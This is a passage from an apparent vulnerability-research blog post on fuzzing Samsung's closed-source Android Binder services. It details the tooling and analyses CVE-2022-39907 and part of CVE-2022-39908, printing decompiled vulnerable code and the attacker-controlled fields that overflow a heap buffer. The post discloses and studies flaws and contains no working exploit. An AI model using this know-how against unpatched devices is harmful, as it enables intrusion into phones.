enabling the dynamic inspection of Java classes, functions and objects. The tool starts its procedure by attempting to kill most of the running services by triggering a restart of <strong>Zygote</strong>, the Android equivalent of <strong>init</strong> which is a parent to many many processes. During the restart, the top level services are listed while they register themselves to the service manager. The Reflection API is then employed to inspect the services at the interface level: it is possible to list every function exposing a transaction, to get their parameters, and even to dynamically generate the needed arguments through their class. This knowledge is used in a second step for genetic fuzzing.</p><p>This is a good method that doesn&rsquo;t have to meddle with the serialization and the low-level Binder primitives, however it can only be used with services possessing a Java interface. Chizpurfle&rsquo;s code is available <a href=https://github.com/dessertlab/fantastic_beasts>on GitHub</a>.</p><p><a href=https://www.usenix.org/conference/usenixsecurity20/presentation/liu><strong>FANS</strong></a> is a newer attempt that is built on top of AOSP, from which the C++ build system is augmented with a Clang extension. The plugin dumps the server stub&rsquo;s AST during the build process. This info is very rich and will be thoroughly statically analyzed in a second step: each argument can be identified by its name and its low-level type as it is deserialized, and each performed sanity check can be recorded. This investigation methodology is also applied on a few extra pieces of code, such as for example the custom Binder objects inheriting <code>Parcelable</code>. Once information about all the services is gathered, a dependency graph is computed. Finally a custom fuzzer will carefully use the results: the transactions are tested with arguments having the correct type and respecting the identified constraints.</p><p>This strategy is in a way similar to Chizpurfle in that it tries to be exhaustive and to understand the grammar of the transactions. It compensates not using the high-level types from the interface with the knowledge of the server stub&rsquo;s restrictions. Unfortunately, it is restricted to the open-source C++ services. FANS&rsquo; code is available <a href=https://github.com/iromise/fans>on GitHub</a>.</p><h2 id=building-the-analysis>Building the Analysis</h2><p>This figure represents the targets from the 3 fuzzers just exposed:</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/surface.png target=_blank><img src=/posts/img/samsung-system-services/surface.png alt="Surface of the reviewed fuzzers"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Binder Cracker is marked in a darker shade as it is not exhaustive.</figcaption></figure></p><p>We can quickly identify two attack surfaces that seem clearly less investigated:</p><ol><li>The native (written in C++) services that are added by the manufacturer (i.e. for which we don&rsquo;t have the source code, contrary to what FANS is doing with AOSP).</li><li>Services brought by the installed apps.</li></ol><p>I didn&rsquo;t really want to battle with the second one, because of the hassle of discovering and properly launching services that are heavily dependent on an application specific logic. It is also a less appealing objective given that we cannot gain higher system permissions this way (but we can still tamper with the app so it is a valid issue).</p><p>So let&rsquo;s focus on fuzzing the closed-source native system services!</p><p>&ldquo;Apart&rdquo; from them being closed-source, we learned during the literature review that this kind of service is already well-covered by FANS, so maybe we could reuse it here? Well, let&rsquo;s explicitly detail all the bricks that FANS is made of to begin with again:</p><ol><li><em>File identification</em>. The build log from AOSP is parsed to look for the files related to the system services.</li><li><em>Analysis</em>. It reasons statically from Clang&rsquo;s dumped AST.</li><li><em>Dependencies inference</em>. They are retrieved through the data of the previous analysis.</li><li><em>fuzzing</em>. The engine relies on the result of the analysis and the dependence knowledge.</li></ol><p>Great news, only the first 2 steps look like they need the source code to work. Thus we just need to develop two modules of our own to provide a closed-source alternative, and we might be able to adopt the rest of FANS!</p><p>To sum up, in order for get this to work, we will try to:</p><ol><li>Identify the <em>object code</em> files involved with each service.</li><li>Evaluate the assembly to gather types and constraints like what FANS does with the source files. I attempted to solve this problem with symbolic execution, which may fit our goal, as according to <a href=https://en.wikipedia.org/wiki/Symbolic_execution>Wikipedia</a> it &ldquo;is a means of analyzing a program to determine what inputs cause each part of a program to execute. An interpreter follows the program, assuming symbolic values for inputs rather than obtaining actual inputs as normal execution of the program would&rdquo;.</li></ol><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/modules.png target=_blank><img src=/posts/img/samsung-system-services/modules.png alt="The new fuzzing strategy"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Our new modules in the grand scheme of fuzzing.</figcaption></figure></p><h3 id=the-1st-module-dynamic-search>The 1st module: Dynamic Search</h3><p>The goal of this module is, as its name astutely implies, to dynamically retrieve info about the running system services, directly on a phone. To achieve this, various sources are queried, then cross-referenced:</p><ul><li>The <em>Service Manager</em>. As <a href=#where>previously explained</a> we can use it to list the top level services. We also get their interface descriptor.</li><li>The <em>binderfs</em>. It&rsquo;s a debug filesystem for the Binder, providing access to the <em>bookkeeping</em> established by the underlying driver. With this, we know the service nodes and references owned by each running process.</li><li>The <em>procfs</em>. We need it to get the memory mappings and consequently the association between processes and libraries.</li><li>The <em>system libraries</em>. As a first intent we can quickly parse them to obtain the exported symbols, and index the Binder interfaces and standardized stubs among them.</li></ul><p><a href=/posts/img/samsung-system-services/dynamic_search.png target=_blank><img src=/posts/img/samsung-system-services/dynamic_search.png alt="The Dynamic Search module"></a></p><h3 id=the-2nd-module-symbolic-execution>The 2nd module: Symbolic Execution</h3><p>The objective here is a tad bit more ambitious: we&rsquo;re analyzing the deserialization stubs from the assembly, picking all the possible execution paths in them, and deducing the valid combinations of arguments for a given transaction. Because we chose to use symbolic execution, we record every constraint we recognize along these paths, and especially the verifications enforced on the parameters. This way, it is possible to learn more precise types and constraints for all the arguments. We&rsquo;re trying to get something usable by the third and fourth modules of FANS, which originally expect detailed data gathered from the source code.</p><p>Since the stubs we consider are very small, and we want to take advantage of their standardized structure, we chose to develop our own very little symbolic execution engine (nope, we did it because it was fun!). It is really basic and tailored to work with the server stubs so it probably will not work with anything else. Additionally, to keep things relatively simple, we built our module on top of two very powerful tools:</p><ul><li><a href=https://www.microsoft.com/en-us/research/project/z3-3>The <em>Z3 solver</em></a>. It is very useful to record the constraints we gather through the symbolic execution and to discard an infeasible path.</li><li><a href=https://hex-rays.com/ida-pro>The <em>IDA decompiler</em></a>. In order to output C code from assembly, <a href=https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Decompiler-internals-microcode.pdf>IDA actually goes through a process mirroring what a compiler would do but in a reverse order</a>. The assembly is first translated into an intermediate language called the <strong>microcode</strong>; then these new opcodes go through many optimization phases, transforming into a higher-level representation; finally they are converted to a <strong>ctree</strong> which is a kind of AST. Instead of building our symbolic execution on assembly language, we leveraged the most mature (i.e. high-level) microcode, as it is easier to manipulate and has less instructions to support. For instance, our symbolic variables rely on IDA local variables with the <em>Single Static Assignment</em> (SSA) form.</li></ul><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/symbolic_execution.png target=_blank><img src=/posts/img/samsung-system-services/symbolic_execution.png alt="The Symbolic Execution Module"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>To determine the execution paths among a deserialization stub, IDA does the heavy-lifting for us: we get a graph to traverse, and within each block a few instructions to emulate.<br><br>By parsing the instructions we can get the argument types from the data Parcel.<br>Here, the first one is a <code>String16</code>, and the second one a Parcelable object, from the <code>CreateTrackInput</code> class.<br><br>On the edges, we record the conditions applying to these arguments.<br>In this example the first parameter should be equal to <code>android.media.IAudioFlinger</code> to pursue the execution. This is indeed coherent since the first argument of a transaction is usually the interface descriptor.<br><br>At the bottom of the represented graph we&rsquo;re able to rule out one of the two paths thanks to Z3.</figcaption></figure></p><p>If you desire more information about IDA&rsquo;s microcode you may <a href=https://hex-rays.com/blog/microcode-in-pictures>have a look at their blog</a>.</p><h1 id=to-the-galaxy-and-beyond>To the Galaxy, and Beyond</h1><p>Now that we have built shiny new tools, let&rsquo;s play with them! To try them out, I fuzzed the <em>Samsung Galaxy J6</em>. It seemed quite an interesting choice for the following reasons:</p><ul><li>It isn&rsquo;t a shiny new phone! This shouldn&rsquo;t be a positive point, but here it is because we are re-using some components of FANS. Originally, FANS targeted <code>x86</code> Android 9. We already have a bit of porting to do to support the <em>J6</em>, whose services are running on <code>ARMv7</code> Android 10. Each version of Android comes with its share of system changes, so for a first test let&rsquo;s not be too ambitious here with newer phones.</li><li>At the time of the campaign, it was already too obsolete to be in <em>Samsung</em>&rsquo;s <a href=https://security.samsungmobile.com/workScope.smsb>security updates program</a>. However, there is a sibling model, the <em>J6+</em>, which was listed as a target for updates! This is good since it isn&rsquo;t too bold to suppose that most of the services from the <em>J6</em> are also present in the <em>J6+</em>.</li><li><em>Samsung</em> is the biggest vendor of <em>Android</em> phones, so we expect them to at least add a few complex customized services.</li></ul><p>The modules did their job! With the dynamic search, I discovered that <em>Samsung</em> added <strong>24 completely new service interfaces</strong> to the phone (on top of the ones from AOSP). Among them, 9 were designed for use by a client, leaving 15 interfaces open to fuzzing. It&rsquo;s also a relief that we didn&rsquo;t restrict our scope to discovering the top level services, since only 9 out of these 15 were, so we might have missed one third of the attack surface.</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/graph.png target=_blank><img src=/posts/img/samsung-system-services/graph.png alt="Dependency graph on a J6"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>The dependency graph of the interfaces on a J6, restricted to the new services and their direct neighbors.<br>A full line indicates a parent relationship, i.e. how you can get one interface from another.<br>A dotted line indicates an interface used as an argument for another.</figcaption></figure></p><p>I fuzzed all these 15 interfaces. That represents a total of 108 transactions. And I discovered&mldr; nothing interesting! I have to admit that it was a bit disappointing after all this work, even if it is actually a great thing to not find bugs. Yes, we triggered a few crashes, but most of them were SIGABRT risen from some asserts and LLVM sanitizers (in particular over/underflow checks from UBSan), which were purposely left in production.</p><p>But I was not discouraged and did not stop here. Indeed, we discovered <a href=#who>previously</a> that the constructors can not only add system services, but they also usually modify the ones from AOSP to include more transactions! In fact, just by looking at the direct dependency from AOSP depicted in the graph above, I know of 3 augmented interfaces. That was 10 more transactions to fuzz, hooray!</p><p>Eventually the great divinities of fuzzing bestowed some bugs from the <code>media.extractor</code> service upon us.</p><h2 id=cve-2022-39907>CVE-2022-39907</h2><p>Things started with a crash of the <code>media.extractor</code> process while I was fuzzing the 6th transaction of the <code>IMediaExtractorService</code>, so let&rsquo;s start by looking at the code (rebuilt from decompilation) of the server-side Binder stub, located in <code>libmedia.so</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>status_t BnMediaExtractorService<span style=color:#f92672>::</span>onTransact(
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> code, <span style=color:#66d9ef>const</span> Parcel<span style=color:#f92672>&amp;</span> data, Parcel<span style=color:#f92672>*</span> reply, <span style=color:#66d9ef>uint32_t</span> flags
</span></span><span style=display:flex><span>) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>switch</span> (code) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Other transactions [...]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>6</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>      <span style=color:#75715e>// The first transaction argument needs to be the interface descriptor for IMediaExtractorService
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      CHECK_INTERFACE(IMediaExtractorService, data, reply);
</span></span><span style=display:flex><span>      <span style=color:#75715e>// The second transaction argument needs to be a reference from an instance of IMemory
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      sp<span style=color:#f92672>&lt;</span>IMemory<span style=color:#f92672>&gt;</span> input <span style=color:#f92672>=</span> IMemory<span style=color:#f92672>::</span>asInterface(reply<span style=color:#f92672>-&gt;</span>readStrongBinder());
</span></span><span style=display:flex><span>      <span style=color:#75715e>// The second argument is directly passed to the actual service,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#75715e>// a reference to another IMemory instance seems to be retrieved as a result
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      sp<span style=color:#f92672>&lt;</span>IMemory<span style=color:#f92672>&gt;*</span> output_p <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>decodeVideoFrame(<span style=color:#f92672>&amp;</span>input);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (output_p) {
</span></span><span style=display:flex><span>        sp<span style=color:#f92672>&lt;</span>IMemory<span style=color:#f92672>&gt;</span> output <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>output_p;
</span></span><span style=display:flex><span>        <span style=color:#75715e>// The first response seems to be an error code
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        reply<span style=color:#f92672>-&gt;</span>writeInt32(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// The second response is the reference to the resulting IMemory
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        reply<span style=color:#f92672>-&gt;</span>writeStrongBinder(IInterface<span style=color:#f92672>::</span>asBinder(output));
</span></span><span style=display:flex><span>      } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// An error happened
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        reply<span style=color:#f92672>-&gt;</span>writeInt32(<span style=color:#ae81ff>0x80000000</span>);
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#75715e>// Status code for the transaction, not the service logic
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#66d9ef>return</span> NO_ERROR;
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Other transactions [...]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We learn that the only real argument to this transaction is a reference to another Binder service, with the <code>IMemory</code> interface. This service is actually a very standard Android one. To put it shortly, it is a service designed to enable two processes to share a memory region. Whether or not it was intended (for a normal user in this particular transaction) to retrieve this <code>IMemory</code> reference (and the associated memory) from another service is not important, because the client here might just host the service itself if it wants to.</p><p>In addition, the server stub is the place where we might find some early sanity checks for the arguments, but here there are no checks, apart from the standard interface descriptor verification. By looking at the function names we can also infer that the transaction probably takes some encoded video buffer as input and gives a decoded buffer in return. Consequently, here we could use a memory region whose content and size we both control as an argument, therefore not necessarily respecting the expected frame format.</p><p>Now, looking at the code of the service in <code>libmediaextractor.so</code>, we can see that a pointer to the shared memory region is retrieved from a call to <code>IMemory::pointer</code>, then passed to what seems to be an instantiation of a custom decoder. No checks are added here either.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>sp<span style=color:#f92672>&lt;</span>IMemory<span style=color:#f92672>&gt;*</span> MediaExtractorService<span style=color:#f92672>::</span>decodeVideoFrame(sp<span style=color:#f92672>&lt;</span>IMemory<span style=color:#f92672>&gt;</span> <span style=color:#f92672>*</span>memory)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> secVideoFrame_p <span style=color:#f92672>=</span> (<span style=color:#f92672>*</span>memory)<span style=color:#f92672>-&gt;</span>pointer();
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (ptr) {
</span></span><span style=display:flex><span>    sp<span style=color:#f92672>&lt;</span>SthmbcAdapter<span style=color:#f92672>&gt;</span> adapter <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> SthmbcAdapter();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> adapter<span style=color:#f92672>-&gt;</span>decode(secVideoFrame_p);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We shall then go further and look into the decoder&rsquo;s function <code>SthmbcAdapter::decode</code>, which contains the real logic. It lives in a third system library, <code>libsadapter.so</code>. We included a snippet from the beginning of the code, since it&rsquo;s the part triggering the bug, but the whole implementation is actually longer.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>sp<span style=color:#f92672>&lt;</span>IMemory<span style=color:#f92672>&gt;*</span> SthmbcAdapter<span style=color:#f92672>::</span>decode(SecVideoFrame<span style=color:#f92672>*</span> secVideoFrame) {
</span></span><span style=display:flex><span>  <span style=color:#75715e>// In the following code we&#39;re showing secVideoFrame as if it were an uint_32_t array
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>uint32_t</span> size <span style=color:#f92672>=</span> secVideoFrame[<span style=color:#ae81ff>9</span>] <span style=color:#f92672>+</span> secVideoFrame[<span style=color:#ae81ff>10</span>] <span style=color:#f92672>+</span> <span style=color:#ae81ff>44</span>; <span style=color:#75715e>// Possible integer overflow!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>uint32_t</span> control <span style=color:#f92672>=</span> secVideoFrame[<span style=color:#ae81ff>5</span>];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (control <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>107</span>) {
</span></span><span style=display:flex><span>    size <span style=color:#f92672>*=</span> <span style=color:#ae81ff>2</span>; <span style=color:#75715e>// Possible integer overflow again!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> heapBufferSize <span style=color:#f92672>=</span> size <span style=color:#f92672>+</span> <span style=color:#ae81ff>32</span>; <span style=color:#75715e>// Possible integer overflow again!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> heapBuffer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>char</span>[heapBufferSize]; <span style=color:#75715e>// [1]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>heapBuffer) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Error path [...]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }
</span></span><span style=display:flex><span>  memset(heapBuffer, <span style=color:#ae81ff>0</span>, heapBufferSize);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> length <span style=color:#f92672>=</span> secVideoFrame[<span style=color:#ae81ff>10</span>];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>length) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Error path [...]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }
</span></span><span style=display:flex><span>  memcpy(heapBuffer, secVideoFrame <span style=color:#f92672>+</span> secVideoFrame[<span style=color:#ae81ff>9</span>] <span style=color:#f92672>+</span> <span style=color:#ae81ff>44</span>, length); <span style=color:#75715e>// [2]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// Much more code [...]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>The problem in this snippet is the call to <code>memcpy</code> at <em>[2]</em>. The target buffer is allocated in the heap just before, at <em>[1]</em>, however it is easily possible to overflow the computation of the buffer&rsquo;s size. Therefore the size of <code>heapBuffer</code> can be maliciously manipulated to be smaller than the variable <code>length</code> governing the <code>memcpy</code>, transforming the integer overflow into a heap overflow.</p><p>Fortunately, it may prove quite difficult for an attacker to use this error. Indeed, to trigger the integer overflow here we should make either <code>secVideoFrame[9]</code> or <code>secVideoFrame[10]</code> very high. Yet these variables also respectively dictate the source and the length of the <code>memcpy</code>. Besides, we may not really want to underflow/overflow <code>secVideoFrame</code> as it points to the shared memory region which is thus very likely to be surrounded by unmapped memory. For these reasons, a too high length is sure to cause a crash. Finally, since <code>media.extractor</code> is a process with some extra-privileges, it is a bit hardened and therefore relies on <code>Scudo</code> rather than the <code>Android 10</code> default allocator <code>jemalloc</code>. Since <code>Scudo</code> was designed to prevent heap overflows (among other vulnerabilities), it introduces protections such as the randomization of our <code>heapBuffer</code> allocation. Due to all these points, writing an exploit seemed difficult and I chose not to try further.</p><h2 id=cve-2022-39908>CVE-2022-39908</h2><p>The last bug we found was not very deep, but still a good start for sure, so let&rsquo;s keep on digging: it smells like there might be more issues with such a decoding function, that works on arbitrary memory input. In order to go further, I had the hunch to look into the internals of the memory-sharing interface <code>IMemory</code>. To do that, we just have to open a browser and go to <a href=https://cs.android.com>Android Code Search</a>. For starters it would be fine to look at the current version of the service and then to go back to <code>Android 10</code> if deemed necessary, so the following extracts of code come from the mainline version at the time of writing.</p><p>Things start to look interesting as soon as we retrieve the definition of <code>IMemory::pointer</code>, which lies in <code>frameworks/native/libs/binder/IMemory.cpp</code>. The function has been deprecated and now just returns its new version, innocuously named <code>IMemory::unsecurePointer</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> IMemory<span style=color:#f92672>::</span>pointer() <span style=color:#66d9ef>const</span> { <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>unsecurePointer</span>(); }
</span></span></code></pre></div><p>The second function is rather simple. It retrieves a reference to another underlying interface, <code>IMemoryHeap</code> and calls the <code>base()</code> method on it. This seems to give us a pointer to the shared memory region&rsquo;s start. An offset is then added to this starting pointer, retrieved along the <code>IMemoryHeap</code> reference:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> IMemory<span style=color:#f92672>::</span>unsecurePointer() <span style=color:#66d9ef>const</span> {
</span></span><span style=display:flex><span>  ssize_t offset;
</span></span><span style=display:flex><span>  sp<span style=color:#f92672>&lt;</span>IMemoryHeap<span style=color:#f92672>&gt;</span> heap <span style=color:#f92672>=</span> getMemory(<span style=color:#f92672>&amp;</span>offset);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> <span style=color:#66d9ef>const</span> base <span style=color:#f92672>=</span> heap<span style=color:#f92672>!=</span><span style=color:#66d9ef>nullptr</span> <span style=color:#f92672>?</span> heap<span style=color:#f92672>-&gt;</span>base() <span style=color:#f92672>:</span> MAP_FAILED;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (base <span style=color:#f92672>==</span> MAP_FAILED)
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>nullptr</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>static_cast</span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>char</span><span style=color:#f92672>*&gt;</span>(base) <span style=color:#f92672>+</span> offset;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>If we move to look at the transaction <code>IMemory::getMemory()</code>, we can see a somewhat curious structure. The client stub is unusually full of checks:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>sp<span style=color:#f92672>&lt;</span>IMemoryHeap<span style=color:#f92672>&gt;</span> BpMemory<span style=color:#f92672>::</span>getMemory(ssize_t<span style=color:#f92672>*</span> offset, size_t<span style=color:#f92672>*</span> size) <span style=color:#66d9ef>const</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (mHeap <span style=color:#f92672>==</span> <span style=color:#66d9ef>nullptr</span>) {
</span></span><span style=display:flex><span>        Parcel data, reply;
</span></span><span style=display:flex><span>        data.writeInterfaceToken(IMemory<span style=color:#f92672>::</span>getInterfaceDescriptor());
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (remote()<span style=color:#f92672>-&gt;</span>transact(GET_MEMORY, data, <span style=color:#f92672>&amp;</span>reply) <span style=color:#f92672>==</span> NO_ERROR) {
</span></span><span style=display:flex><span>            sp<span style=color:#f92672>&lt;</span>IBinder<span style=color:#f92672>&gt;</span> heap <span style=color:#f92672>=</span> reply.readStrongBinder();
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (heap <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nullptr</span>) {
</span></span><span style=display:flex><span>                mHeap <span style=color:#f92672>=</span> interface_cast<span style=color:#f92672>&lt;</span>IMemoryHeap<span style=color:#f92672>&gt;</span>(heap);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (mHeap <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nullptr</span>) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>int64_t</span> offset64 <span style=color:#f92672>=</span> reply.readInt64();
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>uint64_t</span> size64 <span style=color:#f92672>=</span> reply.readUint64();
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>const</span> ssize_t o <span style=color:#f92672>=</span> (ssize_t)offset64;
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>const</span> size_t s <span style=color:#f92672>=</span> (size_t)size64;
</span></span><span style=display:flex><span>                    size_t heapSize <span style=color:#f92672>=</span> mHeap<span style=color:#f92672>-&gt;</span>getSize();
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (s <span style=color:#f92672>==</span> size64 <span style=color:#f92672>&amp;&amp;</span> o <span style=color:#f92672>==</span> offset64 <span style=color:#75715e>// ILP32 bounds check
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                            <span style=color:#f92672>&amp;&amp;</span> s <span style=color:#f92672>&lt;=</span> heapSize
</span></span><span style=display:flex><span>                            <span style=color:#f92672>&amp;&amp;</span> o <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>                            <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#66d9ef>static_cast</span><span style=color:#f92672>&lt;</span>size_t<span style=color:#f92672>&gt;</span>(o) <span style=color:#f92672>&lt;=</span> heapSize <span style=color:#f92672>-</span> s)) {
</span></span><span style=display:flex><span>                        mOffset <span style=color:#f92672>=</span> o;
</span></span><span style=display:flex><span>                        mSize <span style=color:#f92672>=</span> s;
</span></span><span style=display:flex><span>                    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                        <span style=color:#75715e>// Hm.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                        android_errorWriteWithInfoLog(<span style=color:#ae81ff>0x534e4554</span>,
</span></span><span style=display:flex><span>                            <span style=color:#e6db74>&#34;26877992&#34;</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#66d9ef>nullptr</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>                        mOffset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>                        mSize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (offset) <span style=color:#f92672>*</span>offset <span style=color:#f92672>=</span> mOffset;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (size) <span style=color:#f92672>*</span>size <span style=color:#f92672>=</span> mSize;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> (mSize <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) <span style=color:#f92672>?</span> mHeap : <span style=color:#66d9ef>nullptr</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Whereas the server implementation is kept to the bare minimum:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>case</span> GET_MEMORY: {
</span></span><span style=display:flex><span>  CHECK_INTERFACE(IMemory, data, reply);
</span></span><span style=display:flex><span>  ssize_t offset;
</span></span><span style=display:flex><span>  size_t size;
</span></span><span style=display:flex><span>  reply<span style=color:#f92672>-&gt;</span>writeStrongBinder( IInterface<span style=color:#f92672>::</span>asBinder(getMemory(<span style=color:#f92672>&amp;</span>offset, <span style=color:#f92672>&amp;</span>size)) );
</span></span><span style=display:flex><span>  reply<span style=color:#f92672>-&gt;</span>writeInt64(offset);
</span></span><span style=display:flex><span>  reply<span style=color:#f92672>-&gt;</span>writeUint64(size);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> NO_ERROR;
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>break</span>;
</span></span></code></pre></div><p>This is the illustration of the shared memory region&rsquo;s inverted usage: the server for the <code>getMemory()</code> transaction might be the unprivileged process here, and we should not believe anything it says about the memory (e.g. its size) before making sure it is true. A process could in fact mimic a service answering all the <code>IMemory</code> transaction codes in whatever way it desires. The client verifications have already been found to be lacking against such a &ldquo;bad memory sharer&rdquo; in the past, see for example the <a href=https://android.googlesource.com/platform/frameworks/native/+/f3199c228aced7858b75a8070b8358c155ae0149%5E%21/#F0>diff for CVE-2016-0846</a>.</p><p>Under the hood, to make memory accessible by two processes, the Binder manipulates objects specified in the <code>IMemoryHeap</code> interface. The call to <code>IMemoryHeap::base()</code> from <code>IMemory::unsecurePointer()</code> as we saw earlier goes down to <code>BpMemoryHeap::getBase</code>. This function will return the <code>mBase</code> class attribute but only after checking whether it was correctly initialized through <code>BpMemoryHeap::assertMapped()</code>, that checks the sharing status. If the current state is not properly set, it handles the mapping 